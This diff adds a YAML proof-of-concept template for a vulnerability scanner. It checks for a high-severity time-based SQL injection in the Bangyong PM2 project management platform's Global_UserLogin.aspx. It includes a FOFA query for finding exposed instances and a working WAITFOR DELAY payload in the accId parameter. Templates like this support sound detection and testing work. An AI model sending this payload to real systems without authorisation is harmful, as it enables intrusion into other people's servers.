@@ -1,0 +1,17 @@
+id: poc-yaml-pm2-global-iserlogin-aspx-sqli
+info:
+  name: 邦永PM2项目管理平台 Global_UserLogin.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: PM2项目管理平台
+  fofa: body="PM2项目管理"
+variables:
+  t1: random_int(2,5)
+  t2: (t1 * 2) + 1
+requests:
+- method: GET
+  path: /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--&loginCode&password&type
+  expression: status_code == 200 && contains(body,"WAITFOR") && contains(body,"无法找到编号为")
+    && duration >= t1 * 2 && duration < t2
+transport: http
